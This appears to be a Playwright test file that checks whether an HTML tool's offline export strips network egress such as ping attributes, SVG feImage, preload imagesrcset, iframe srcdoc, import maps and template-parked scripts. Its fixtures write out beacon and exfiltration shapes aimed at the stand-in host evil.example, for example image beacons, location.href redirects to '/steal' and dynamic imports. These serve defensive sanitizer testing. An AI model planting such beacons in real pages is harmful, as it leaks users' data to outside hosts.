  // single `feImage` selector spelling - case-sensitive for SVG, case-insensitive for HTML - the
  // whole mechanism rather than an incidental detail.
  '<feimage id="cmh-fe-html-ns" href="https://evil.example/html-ns-fe.png"></feimage>',
].join("\n");

// The attribute value carried by the element with `id`, or undefined when it carries none. Read off
// the SERIALIZED export rather than a DOM, because what ships is the text.
function attrOfId(html, id, attr) {
  const tag = (html.match(new RegExp(`<[a-zA-Z][^>]*\\sid="${id}"[^>]*>`)) || [])[0];
  if (!tag) return null;
  const m = tag.match(new RegExp(`\\s${escapeRegExp(attr)}\\s*=\\s*"([^"]*)"`, "i"));
  return m ? m[1] : undefined;
}

test("CMH-OFFLINE-04: hyperlink auditing and an SVG feImage are stripped from an offline export", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageContent(PING_FEIMAGE_CONTENT, { key: "cmh-offline-ping-feimage", source: "offline-ping-feimage.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    // The shapes are live on the SOURCE document, so the assertions below are about a strip that
    // ran rather than about markup a parser silently dropped.
    expect(await page.evaluate(() => document.getElementById("cmh-ping-link").ping))
      .toContain("evil.example");
    expect(await page.evaluate(() => document.getElementById("cmh-fe-href").getAttribute("href")))
      .toContain("evil.example");
    // The one spelling that reaches BOTH namespaces, which is the whole mechanism the strip relies
    // on: four SVG-namespaced primitives (matched case-sensitively) plus the one authored outside
    // `<svg>` in the HTML namespace (matched case-insensitively).
    expect(await page.evaluate(() => document.querySelectorAll("feImage").length)).toBe(5);
    expect(await page.evaluate(() =>
      document.getElementById("cmh-fe-html-ns").namespaceURI)).toBe("http://www.w3.org/1999/xhtml");
    expect(await page.evaluate(() =>
      document.getElementById("cmh-fe-href").namespaceURI)).toBe("http://www.w3.org/2000/svg");

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "no auditing or filter beacon may survive").not.toContain("evil.example");
    // Neutralized, not deleted: the links, the area and the filter primitives are content.
    for (const id of ["cmh-ping-link", "cmh-ping-relative", "cmh-ping-blank", "cmh-ping-area",
      "cmh-ping-parked", "cmh-ping-svg", "cmh-fe-href", "cmh-fe-xlink", "cmh-fe-relative",
      "cmh-fe-data", "cmh-fe-parked", "cmh-fe-html-ns"]) {
      expect(exportedHtml, `${id} must be kept as an element`).toContain(`id="${id}"`);
    }
    for (const id of ["cmh-ping-link", "cmh-ping-relative", "cmh-ping-area", "cmh-ping-parked",
      "cmh-ping-svg"]) {
      expect(attrOfId(exportedHtml, id, "ping"), `${id} must keep no ping attribute`).toBeUndefined();
    }
    // ...and the value that names no URL is left exactly as authored, on both sides.
    expect(attrOfId(exportedHtml, "cmh-ping-blank", "ping")).toBe(" ");
    expect(attrOfId(exportedHtml, "cmh-ping-link", "href")).toBe("#ping-note");
    expect(attrOfId(exportedHtml, "cmh-fe-href", "href")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-fe-xlink", "xlink:href")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-fe-parked", "href")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-fe-html-ns", "href")).toBeUndefined();
    // ...and no further: the local references are the control, and they must be untouched.
    expect(attrOfId(exportedHtml, "cmh-fe-relative", "href")).toBe("local-tile.png");
    expect(attrOfId(exportedHtml, "cmh-fe-data", "xlink:href")).toBe("data:image/gif;base64,R0lGODlhAQABAAAAACw=");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-ping-feimage.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
    // ...and the other direction, which the clean file alone cannot prove: re-inject each shape
    // into the EXPORTED file and the gate must reject it, so a hand-authored offline document
    // cannot keep what the strip takes away.
    const reinjections = [
      ['<a id="cmh-ping-reinjected" href="#ping-note" ping="https://evil.example/audit">x</a>',
        /<a ping="https:\/\/evil\.example\/audit">/, "POSTs to a network URL"],
      // A RELATIVE ping is rejected too, on the meta-refresh reasoning: the export removes it
      // whatever it names, so accepting one would bless a file an export would change.
      ['<a id="cmh-ping-reinjected" href="#ping-note" ping="audit.php">x</a>',
        /<a ping="audit\.php">/, "audits every click"],
      ['<svg><filter id="cmh-fe-reinjected"><feImage href="https://evil.example/fe.png"></feImage></filter></svg>',
        /<feimage href="https:\/\/evil\.example\/fe\.png">/, "loads over the network"],
      // An NBSP ping is the boundary case: a browser tokenizes the list on ASCII whitespace ONLY,
      // so this names a real relative target and POSTs to it, while a `.strip()`-based gate would
      // have called the value empty and blessed the file.
      ['<a id="cmh-ping-reinjected" href="#ping-note" ping="\u00a0">x</a>',
        /<a ping="[^"]*"> audits every click/, "audits every click"],
    ];
    for (const [markup, labelRe, needle] of reinjections) {
      const reinjectedPath = path.join(outDir, "offline-ping-feimage-reinjected.html");
      const reinjectedHtml = exportedHtml.replace('<p id="ping-note"', markup + '\n<p id="ping-note"');
      expect(reinjectedHtml, "the shape must actually have been re-injected").not.toEqual(exportedHtml);
      fs.writeFileSync(reinjectedPath, reinjectedHtml);
      // Pinned to the rule under test, not merely to a non-zero exit: an exit-code-only assertion
      // would be satisfied by any future rule that rejected this file for an unrelated reason.
      let failure = null;
      try {
        execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
      } catch (err) {
        failure = String(err.stdout || "") + String(err.stderr || "");
      }
      expect(failure, `--strict must reject ${markup}`).not.toBeNull();
      expect(failure).toMatch(labelRe);
      expect(failure).toContain(needle);
    }

    // The strip is the layer that must not DEPEND on the CSP - and hyperlink auditing is the shape
    // where that matters most, since CSP Level 3 folds it into `connect-src` and a current browser
    // most likely absorbs it. So re-open the export with its zero-network policy REMOVED, adopt
    // every parked fragment, click the audited link, and require that nothing leaves the machine.
    const noCspPath = path.join(outDir, "offline-ping-feimage-no-csp.html");
    const cspMetaRe = /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi;
    expect((exportedHtml.match(cspMetaRe) || []).length, "the export must carry a CSP meta").toBeGreaterThan(0);
    const noCspHtml = exportedHtml.replace(cspMetaRe, "");
    expect(noCspHtml.match(cspMetaRe), "every CSP meta must actually have been removed").toBeNull();
    fs.writeFileSync(noCspPath, noCspHtml);
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(noCspPath));
    await ready(page2);
    await page2.evaluate(() => {
      document.querySelectorAll("template").forEach((t) => {
        document.body.appendChild(document.importNode(t.content, true));
      });
    });
    expect(await page2.evaluate(() => document.getElementById("cmh-ping-link").ping)).toBe("");
    expect(await page2.evaluate(() =>
      [...document.querySelectorAll("feImage")].map((el) =>
        (el.getAttribute("href") || "") + " " + (el.getAttribute("xlink:href") || "")).join(" ")))
      .not.toContain("evil.example");
    await page2.evaluate(() => document.getElementById("cmh-ping-link").click());
    // A bare "no request arrived" is a timing artifact unless the harness is PROVEN to observe one,
    // so inject a fresh ping link and click it: waiting for ITS beacon is both the positive control
    // and a deterministic barrier - the stripped link's POST, dispatched first, would have been
    // seen by the time this one arrives.
    const controlUrl = "https://ping-control.example/beacon";
    const controlRequest = page2.waitForRequest(controlUrl);
    await page2.evaluate((url) => {
      const probe = document.createElement("a");
      probe.id = "cmh-ping-control";
      probe.href = "#ping-note";
      probe.setAttribute("ping", url);
      document.body.appendChild(probe);
      probe.click();
    }, controlUrl);
    expect((await controlRequest).method(), "the harness must really observe a ping beacon").toBe("POST");
    // Polled, not read once: `waitForRequest` resolves on the REQUEST event, while `external` is
    // appended by the route handler that runs just after it.
    await expect.poll(() => external, { timeout: 10000 }).toEqual([controlUrl]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// A `<link>` fetches through more than its `href`, and neither the offline strip nor the strict
// validator read the other two attributes (#999): a preload link carries the URL in `imagesrcset`
// with NO href at all, and `imagesizes` rides with it. The controls sit beside the decoys - a local
// candidate list, a `data:` candidate and an ordinary `sizes` value must survive untouched, and
// every link must keep its identity, since only the fetching value goes.
const PRELOAD_IMAGESRCSET_CONTENT = [
  "<h1>Preload links</h1>",
  '<p id="preload-note">A preload link fetches through imagesrcset, with no href at all.</p>',
  '<link id="cmh-preload-net" rel="preload" as="image" imagesrcset="https://evil.example/preload.png 1x, https://evil.example/preload-2x.png 2x" imagesizes="(max-width: 600px) 100vw, 50vw">',
  // One network candidate among local ones is still a fetch, so the whole attribute goes - the
  // tokenizer decides that, not a whole-value test.
  '<link id="cmh-preload-mixed" rel="preload" as="image" imagesrcset="local-tile.png 1x, //evil.example/mixed.png 2x">',
  // `rel`-blind on both sides: the strip clears an ATTRIBUTE rather than removing the element, so
  // there is no content to lose, and a gate that consulted `rel` would drift from it.
  '<link id="cmh-preload-norel" imagesrcset="https://evil.example/norel.png 1x">',
  // `imagesizes` holds media conditions and lengths rather than URLs, so a network value there is
  // malformed either way - but both sides read it, so neither can bless what the other changes.
  '<link id="cmh-preload-sizes" rel="preload" as="image" imagesrcset="local-tile.png 1x" imagesizes="https://evil.example/sizes">',
  // A template-parked one starts preloading the moment a script adopts the fragment, which is why
  // every load pass walks into templates.
  '<template id="cmh-preload-template"><link id="cmh-preload-parked" rel="preload" as="image" imagesrcset="https://evil.example/parked.png 1x"></template>',
  // A <noscript>-parked one is markup a scripting-DISABLED browser really parses and preloads, and
  // it is the axis where the two sides reach the same element by DIFFERENT mechanisms - the export
  // strip parses into a DOMParser document (scripting off, so this is a real element) while the
  // gate reads its own noscript egress view - so it is pinned rather than assumed.
  '<noscript><link id="cmh-preload-noscript" rel="preload" as="image" imagesrcset="https://evil.example/noscript.png 1x"></noscript>',
  // The controls: nothing here reaches the network, so nothing here may change.
  '<link id="cmh-preload-local" rel="preload" as="image" imagesrcset="local-tile.png 1x, local-tile-2x.png 2x" imagesizes="100vw">',
  '<link id="cmh-preload-data" rel="preload" as="image" imagesrcset="data:image/gif;base64,R0lGODlhAQABAAAAACw= 1x">',
].join("\n");

test("CMH-OFFLINE-04: a preload link's imagesrcset and imagesizes are stripped from an offline export", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(PRELOAD_IMAGESRCSET_CONTENT, { key: "cmh-offline-preload-imagesrcset", source: "offline-preload-imagesrcset.html" });
  const outDir = makeTmpDir();
  try {
    const attempted = [];
    await page.route(/^https?:\/\//, async (route) => {
      attempted.push(route.request().url());
      await route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    // The shape is LIVE on the source document - a browser really does issue the request from an
    // attribute neither side used to read - so what follows is about a strip that ran, not about
    // markup a parser silently dropped.
    await expect.poll(() => attempted.filter((u) => /evil\.example\/preload/.test(u)), { timeout: 10000 })
      .not.toEqual([]);

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "no preload fetch may survive").not.toContain("evil.example");
    // Neutralized, not deleted: a `rel`/`as` link is metadata the author wrote.
    for (const id of ["cmh-preload-net", "cmh-preload-mixed", "cmh-preload-norel",
      "cmh-preload-sizes", "cmh-preload-parked", "cmh-preload-noscript", "cmh-preload-local",
      "cmh-preload-data"]) {
      expect(exportedHtml, `${id} must be kept as an element`).toContain(`id="${id}"`);
    }
    expect(attrOfId(exportedHtml, "cmh-preload-net", "imagesrcset")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-preload-mixed", "imagesrcset")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-preload-norel", "imagesrcset")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-preload-parked", "imagesrcset")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-preload-noscript", "imagesrcset")).toBeUndefined();
    expect(attrOfId(exportedHtml, "cmh-preload-sizes", "imagesizes")).toBeUndefined();
    // ...and no further. An `imagesizes` that names no URL is left exactly as authored even on the
    // link whose `imagesrcset` went: it fetches nothing on its own, and removing it would be
    // content loss the gate cannot ask for.
    expect(attrOfId(exportedHtml, "cmh-preload-net", "imagesizes")).toBe("(max-width: 600px) 100vw, 50vw");
    expect(attrOfId(exportedHtml, "cmh-preload-sizes", "imagesrcset")).toBe("local-tile.png 1x");
    expect(attrOfId(exportedHtml, "cmh-preload-local", "imagesrcset")).toBe("local-tile.png 1x, local-tile-2x.png 2x");
    expect(attrOfId(exportedHtml, "cmh-preload-local", "imagesizes")).toBe("100vw");
    expect(attrOfId(exportedHtml, "cmh-preload-data", "imagesrcset")).toBe("data:image/gif;base64,R0lGODlhAQABAAAAACw= 1x");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-preload-imagesrcset.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
    // ...and the other direction, which the clean file alone cannot prove: re-inject each shape and
    // the gate must reject it, so a hand-authored offline document cannot keep what the strip takes.
    const reinjections = [
      ['<link id="cmh-preload-reinjected" rel="preload" as="image" imagesrcset="https://evil.example/re.png 1x">',
        /<link imagesrcset="https:\/\/evil\.example\/re\.png">/, "loads over the network"],
      ['<link id="cmh-preload-reinjected" rel="preload" as="image" imagesrcset="local.png 1x, //evil.example/re2.png 2x">',
        /<link imagesrcset="\/\/evil\.example\/re2\.png">/, "loads over the network"],
      ['<link id="cmh-preload-reinjected" imagesrcset="https://evil.example/norel.png 1x">',
        /<link imagesrcset="https:\/\/evil\.example\/norel\.png">/, "loads over the network"],
      // `imagesizes` is rejected too, but its message must NOT claim a load: a source-size list
      // fetches nothing whatever it says. The export clears a network-valued one, so accepting it
      // would bless a file an export would change - which is what the message says instead.
      ['<link id="cmh-preload-reinjected" rel="preload" as="image" imagesizes="https://evil.example/sizes">',
        /<link imagesizes="https:\/\/evil\.example\/sizes">/, "a browser fetches nothing from it"],
    ];
    for (const [markup, labelRe, needle] of reinjections) {
      const reinjectedPath = path.join(outDir, "offline-preload-reinjected.html");
      const reinjectedHtml = exportedHtml.replace('<p id="preload-note"', markup + '\n<p id="preload-note"');
      expect(reinjectedHtml, "the shape must actually have been re-injected").not.toEqual(exportedHtml);
      fs.writeFileSync(reinjectedPath, reinjectedHtml);
      // Pinned to the rule under test, not merely to a non-zero exit: an exit-code-only assertion
      // would be satisfied by any future rule that rejected this file for an unrelated reason.
      let failure = null;
      try {
        execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
      } catch (err) {
        failure = String(err.stdout || "") + String(err.stderr || "");
      }
      expect(failure, `--strict must reject ${markup}`).not.toBeNull();
      expect(failure).toMatch(labelRe);
      expect(failure).toContain(needle);
    }
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

const SRCDOC_NESTED = [
  '<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">',
  '<img src="https://evil.example/pixel.png" alt="p">',
  '<body onload="new Image().src = \'https://evil.example/steal\'">',
].join("");

function srcdocAttr(markup) {
  return markup.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

const SRCDOC_CONTENT = [
  "<h1>Nested srcdoc document</h1>",
  '<p id="srcdoc-note">A srcdoc carries a whole document inside an attribute value.</p>',
  // The bug: this nested document really does load, refresh, and beacon, and NEITHER side of the
  // offline contract could see it - the strip walks elements (nothing descends into a string) and
  // the validator's tag index reads the markup below as attribute TEXT, never as tags.
  `<iframe id="cmh-srcdoc-beacon" title="beacon" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe>`,
  // The same shapes every other offline pass is held to: a template-parked frame a script can
  // adopt, a <noscript> fallback the reader who cannot run the layer really parses, and a
  // self-closed FOREIGN element - all of which the strip's walk reaches and the gate's index
  // records, so both sides must judge them alike.
  `<template id="cmh-srcdoc-template"><iframe srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe></template>`,
  `<noscript><iframe id="cmh-srcdoc-noscript" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe></noscript>`,
  `<svg width="1" height="1"><iframe id="cmh-srcdoc-foreign" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"/></svg>`,
  // An EMPTY nested document loads nothing, and it goes too: the strip clears the attribute on
  // presence, so a value-inspecting gate would bless a file the export still changes.
  '<iframe id="cmh-srcdoc-empty" title="empty" srcdoc=""></iframe>',
  // ...and no further. A frame that carries no nested document is ordinary content: the ELEMENT,
  // its title and its relative src all survive intact.
  '<iframe id="cmh-srcdoc-keep" title="keep" src="beacon.html"></iframe>',
].join("\n");

// Every frame that still carries a nested document, read by PARSING the exported bytes in the
// browser rather than by regex: the export embeds the whole layer runtime, whose own source comment
// and toast string spell `<iframe srcdoc>` in plain text, and a text scan would read those as
// elements (a script body is text to a parser, so parsing needs no fragile strip pass). Templates
// are walked because their content is an inert fragment `querySelectorAll` cannot reach. Parsed
// with scripting OFF, exactly as the exporter's own DOMParser is, so a `<noscript>` fallback frame
// is seen too. The independent oracle is the `--strict` run below, whose tokenizer shares nothing
// with this.
async function iframeSrcdocValues(page, html) {
  return page.evaluate((source) => {
    const doc = new DOMParser().parseFromString(source, "text/html");
    const found = [];
    const walk = function (root) {
      root.querySelectorAll("iframe").forEach(function (f) {
        if (f.hasAttribute("srcdoc")) found.push(f.getAttribute("srcdoc"));
      });
      root.querySelectorAll("template").forEach(function (t) { if (t.content) walk(t.content); });
    };
    walk(doc);
    return found;
  }, html);
}

test("CMH-OFFLINE-04: an iframe srcdoc carries a nested document neither the strip nor the gate can inspect", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageContent(SRCDOC_CONTENT, { key: "cmh-offline-srcdoc", source: "offline-srcdoc.html" });
  const outDir = makeTmpDir();
  let ctx2;
  let ctx3;
  try {
    const sourceRequests = [];
    await page.route(/^https?:\/\//, async (route) => {
      sourceRequests.push(route.request().url());
      await route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    // The bug, pinned on the SOURCE document: the nested document is live - it fetches, and its
    // meta refresh navigates the frame - so this is egress an offline export must not carry.
    await expect.poll(() => sourceRequests.filter((u) => u.includes("evil.example")).length,
      { message: "the nested srcdoc document must really reach the network" }).toBeGreaterThan(0);
    // ...and the positive control for the reader below: it finds all five nested documents in the
    // source, so an empty result after the export is a strip that ran, not a blind helper.
    expect(await iframeSrcdocValues(page, fs.readFileSync(staged.html, "utf8")),
      "the srcdoc reader must see the frames the source really carries").toHaveLength(5);

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(await iframeSrcdocValues(page, exportedHtml), "no srcdoc may survive an offline export").toEqual([]);
    expect(exportedHtml, "the nested document must leave with the attribute").not.toContain("evil.example");
    // Cleared, not deleted: the frames themselves are content, and so is a relative src.
    for (const id of ["cmh-srcdoc-beacon", "cmh-srcdoc-template", "cmh-srcdoc-noscript",
      "cmh-srcdoc-foreign", "cmh-srcdoc-empty", "cmh-srcdoc-keep"]) {
      expect(exportedHtml, `${id} must be kept as an element`).toContain(`id="${id}"`);
    }
    expect(exportedHtml).toContain('src="beacon.html"');
    expect(exportedHtml).toContain('title="keep"');
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    // Removing a nested document removes content that WORKED offline, so unlike a network strip it
    // must not be silent. 5 = the beacon, template-parked, noscript-parked, foreign and empty
    // frames above; the srcdoc-free control is not counted.
    await expect(page.locator("#toast")).toContainText(
      "5 <iframe srcdoc> nested documents were removed - an offline export cannot inspect a document carried inside an attribute.");

    const exportedPath = path.join(outDir, "offline-srcdoc.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
    // ...and the other direction, which the clean file alone cannot prove: re-inject a srcdoc into
    // the EXPORTED file and the gate must reject it, so a hand-authored offline document cannot
    // keep what the strip takes away.
    const reinjectedPath = path.join(outDir, "offline-srcdoc-reinjected.html");
    const reinjectedHtml = exportedHtml.replace(
      '<iframe id="cmh-srcdoc-keep"',
      `<iframe id="cmh-srcdoc-reinjected" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe>\n<iframe id="cmh-srcdoc-keep"`);
    expect(reinjectedHtml, "the srcdoc must actually have been re-injected").not.toEqual(exportedHtml);
    fs.writeFileSync(reinjectedPath, reinjectedHtml);
    // Pinned to the SRCDOC rule, not merely to a non-zero exit: an exit-code-only assertion would
    // be satisfied by any future rule that rejected this file for an unrelated reason, which is
    // exactly how a fail-open regression in the check under test would go unnoticed.
    let reinjectedFailure = null;
    try {
      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
    } catch (err) {
      reinjectedFailure = String(err.stdout || "") + String(err.stderr || "");
    }
    expect(reinjectedFailure, "--strict must reject a re-injected srcdoc").not.toBeNull();
    expect(reinjectedFailure).toContain("<iframe srcdoc=");
    expect(reinjectedFailure).toContain("carries a nested document");

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    // Adopt every parked fragment, so a template-parked frame would genuinely get its chance to
    // load its nested document.
    await page2.evaluate(() => {
      document.querySelectorAll("template").forEach((t) => {
        document.body.appendChild(document.importNode(t.content, true));
      });
    });
    expect(await page2.evaluate(() => [...document.querySelectorAll("iframe")].filter((f) => f.hasAttribute("srcdoc")).length)).toBe(0);
    expect(external).toEqual([]);

    // The strip is the layer that must not DEPEND on the CSP, so prove it alone: the same export
    // with its zero-network policy removed must still reach no network. Without this the browser
    // evidence above is satisfied even if the strip did nothing.
    const noCspPath = path.join(outDir, "offline-srcdoc-no-csp.html");
    const cspMetaRe = /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi;
    expect((exportedHtml.match(cspMetaRe) || []).length, "the export must carry a CSP meta").toBeGreaterThan(0);
    const noCspHtml = exportedHtml.replace(cspMetaRe, "");
    expect(noCspHtml.match(cspMetaRe), "every CSP meta must actually have been removed").toBeNull();
    fs.writeFileSync(noCspPath, noCspHtml);
    ctx3 = await browser.newContext();
    const page3 = await ctx3.newPage();
    const externalNoCsp = [];
    await page3.route(/^https?:\/\//, async (route) => {
      externalNoCsp.push(route.request().url());
      await route.abort();
    });
    await page3.goto(fileUrl(noCspPath));
    await ready(page3);
    await page3.evaluate(() => {
      document.querySelectorAll("template").forEach((t) => {
        document.body.appendChild(document.importNode(t.content, true));
      });
    });
    expect(externalNoCsp).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    if (ctx3) await ctx3.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
  + 'location.href = "https://evil.example/steal" beacon before we ship this.';

test("CMH-OFFLINE-04: a reviewer comment quoting an egress shape survives, and an untyped legacy data block is repaired", async ({ page, browser }) => {
  test.setTimeout(90000);
  // The two directions the reserved-id exemption exists for. A reviewer legitimately quoting an
  // egress shape (this repo's own issue #784 body does exactly that) must not have their comment
  // stripped; and a LEGACY or hand-authored document whose data block carries no `type` must be
  // repaired to inert data, not executed and not deleted - deleting it is the content loss the
  // exemption was protecting against in the first place.
  const CONTENT_WITH_QUOTE = [
    "<h1>Quoted egress</h1>",
    '<p id="quote-note">A reviewer must be able to quote an egress shape in a comment.</p>',
  ].join("\n");
  const staged = stageContent(CONTENT_WITH_QUOTE, { key: "cmh-offline-quoted-egress", source: "offline-quoted-egress.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    const legacy = fs.readFileSync(staged.html, "utf8").replace(
      '<script type="application/json" id="handledCommentIds">',
      '<script id="handledCommentIds">');
    expect(legacy, "the legacy untyped shape must be staged").toContain('<script id="handledCommentIds">');
    fs.writeFileSync(staged.html, legacy);

    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#quote-note", QUOTED_EGRESS_NOTE);
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml, "the reviewer's words must travel with the file").toContain("evil.example/steal");
    // The singular branch of the inert-data note, which the decoy spec above never reaches.
    await expect(page.locator("#toast")).toContainText(
      "1 script carrying a reserved commentable-html data id was kept as inert data.");

    const exportedPath = path.join(outDir, "offline-quoted-egress.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The exporter and its own strict gate must agree: an untyped block left as-is would fail this,
    // since the validator requires `type="application/json"` for the layer's data blocks.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const handled = document.getElementById("handledCommentIds");
      const embedded = document.getElementById("embeddedComments");
      return {
        handledType: handled && handled.getAttribute("type"),
        embeddedType: embedded && embedded.getAttribute("type"),
        notes: JSON.parse(embedded.textContent || "[]").map((c) => c.note),
      };
    });
    expect(state.handledType).toBe("application/json");
    expect(state.embeddedType).toBe("application/json");
    expect(state.notes).toEqual([QUOTED_EGRESS_NOTE]);
    await expect(page2.locator("#commentList")).toContainText("evil.example/steal");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// Two shapes both offline strips used to walk straight past. A `speculationrules` / `importmap`
// block is ACTIVE but is not JavaScript, so the runnable-type predicate never looked at it; and
// `querySelectorAll` does not descend into a `<template>`, whose content serialization preserves
// verbatim and a second script can adopt and insert.
const ACTIVE_DATA_TEMPLATE_CONTENT = [
  "<h1>Active data blocks and template content</h1>",
  '<p id="active-note">A speculation rule and an import map are active without being JavaScript.</p>',
  // Every speculation ruleset goes: it exists only to make the browser fetch, and the third one
  // here reaches the network through the document's OWN links without naming a URL at all, so no
  // URL-shaped test could have caught it. The fourth is external and unreviewable.
  '<script type="speculationrules">{"prerender": [{"urls": ["https://evil.example/prerender-beacon"]}]}</script>',
  '<script type="speculationrules">{"prerender": [{"urls": ["local-next.html"]}]}</script>',
  '<script type="speculationrules">{"prefetch": [{"source": "document", "eagerness": "immediate", "tag": "cmhDocSourceRuleset"}]}</script>',
  '<script type="speculationrules" src="cmh-external-rules.json"></script>',
  // An import map goes when any reference in it is not relative - in every spelling JSON allows,
  // since the decision parses the body rather than reading its text - or when it is external.
  '<script type="importmap">{"imports": {"beacon": "https://evil.example/importmap-beacon.js"}}</script>',
  '<script type="importmap">{"imports": {"escaped": "https:\\u002f\\u002fevil.example/escaped-beacon.js"}}</script>',
  '<script type="importmap">{"imports": {"backslash": "/\\\\evil.example/backslash-beacon.js"}}</script>',
  '<script type="importmap">{"imports": {"blobbed": "blob:https://evil.example/blob-beacon"}}</script>',
  '<script type="importmap">{"scopes": {"https://cdn.example/scoped-beacon/": {"x": "./x.js"}}}</script>',
  '<script type="importmap">{"imports": {"broken": "./ok.js"} oops-invalid-json</script>',
  '<script type="importmap" src="cmh-external-map.json"></script>',
  // Local-only: preserved, exactly as a relative media reference is.
  '<script type="importmap" id="localMap">{"imports": {"local-lib": "./local-lib.js"}}</script>',
  // A MIME-parameter spelling is NOT the keyword type, so a browser treats it as inert data and
  // so must the strip - deleting an author's inert block is the costlier error.
  '<script type="importmap;charset=utf-8" id="paramMap">{"imports": {"inert": "https://evil.example/inert-data.js"}}</script>',
  // A template parked with everything the strips are supposed to take away.
  '<template id="hostileTemplate">',
  '  <script type="text/javascript" id="parkedBeacon">',
  "    window.__cmhParkedRan = true;",
  '    import("https://evil.example/parked.js").catch(function () {});',
  '    location.href = "https://evil.example/parked-steal";',
  "  <\/script>",
  '  <script type="importmap">{"imports": {"parked": "https://evil.example/parked-map.js"}}</script>',
  '  <script type="text/javascript" id="reviewedSections">window.__cmhParkedReservedRan = true;</script>',
  '  <img id="parkedImg" alt="parked" src="https://evil.example/parked-pixel.png">',
  "  <style>.parked { background-image: url(https://evil.example/parked-bg.png); }</style>",
